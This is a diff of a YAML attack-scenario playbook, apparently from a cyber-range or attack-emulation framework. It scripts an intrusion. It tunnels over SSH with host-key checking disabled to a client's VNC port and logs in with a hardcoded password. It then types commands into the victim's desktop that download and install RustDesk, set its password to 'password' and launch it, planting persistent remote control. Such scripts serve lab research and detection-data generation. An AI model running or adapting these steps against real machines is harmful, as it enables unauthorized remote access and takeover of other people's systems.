@@ -16,10 +16,14 @@ vars:
 
 
 commands:
-  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5902 (vnc)
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
   # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
   - type: shell
-    cmd: ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP 
+    interactive: true
+    creates_session: tunnel
+    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
+
+
 
   - type: vnc
     cmd: capture
@@ -29,22 +33,84 @@ commands:
     password: garland
     creates_session: social_engineering
 
+  - type: vnc
+    cmd: move
+    x: 300
+    y: 300
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
   - type: vnc 
     cmd: type 
-    input: curl -o rustdesk.deb $RUSTDESK_PACKAGE && sudo apt install -fy ./rustdesk.deb && sleep 1
+    input: "sudo wget -O rustdesk.deb -e use_proxy=yes -e https_proxy=https://192.168.50.254:3128 https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb"
     session: social_engineering
 
   - type: sleep
-    seconds: 60 
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 30
+
+  - type: vnc 
+    cmd: type 
+    input: "sudo apt install -fy ./rustdesk.deb"
+    session: social_engineering
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+  
+  - type: sleep
+    seconds: 30
 
   - type: vnc
     cmd: capture
     filename: post_install.png
-    creates_session: social_engineering
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
 
   - type: vnc
     cmd: type
-    input: rustdesk --set-password password
+    input: "rustdesk --set-password password"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: type
+    input: "rustdesk"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 2
 
 
   
